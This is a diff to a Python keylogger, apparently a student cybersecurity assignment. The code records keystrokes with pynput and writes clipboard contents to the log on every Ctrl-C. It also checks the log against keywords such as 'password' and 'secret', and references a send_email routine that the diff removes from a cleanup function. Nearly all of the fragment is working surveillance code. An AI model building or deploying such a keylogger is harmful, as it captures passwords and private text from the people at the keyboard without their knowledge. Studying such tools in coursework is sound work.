@@ -1,3 +1,7 @@
+# Vannes Fanges TP059686
+# APU3F2211CS(CYB)
+
+
 from pynput import keyboard
 from pynput.keyboard import Key
 from datetime import datetime
@@ -27,10 +31,6 @@ def popup_message(title, message):
     # Create a popup message box
     messagebox.showinfo(title, message)
 
-def cleanup_function():
-    # Perform cleanup actions or trigger desired function
-    if search():
-        send_email()
 
 def stamp(fp, prev, init=False, gap=10):
     now = datetime.now()
@@ -66,7 +66,7 @@ def keyPressed(key):
                 if char == b'\x03':
                     logKey.write("<ctrl-c>")
                     clipboard_contents = get_clipboard_contents()
-                    logKey.write(f"\n[Clipboard: {clipboard_contents}]\n")
+                    logKey.write(f"\n[Clipboard: {clipboard_contents}]\n" + " "*29)
                 elif char == b'\x16':
                     logKey.write("<ctrl-v>")
 
@@ -146,8 +146,6 @@ def search():
         'exploit',
         'malware',
         'virus',
-        'phishing',
-        'password',
         'secret',
         'attack',
         'intrusion',
@@ -169,7 +167,6 @@ def search():
         "transfers",
         "abuse",
         "privileges",
-        "system",
         "changes",
         "file",
         "misuse",
@@ -188,7 +185,6 @@ def search():
         "social",
         "engineering",
         "phishing",
-        "password",
         "identity",
         "disclosure",
         "copying",
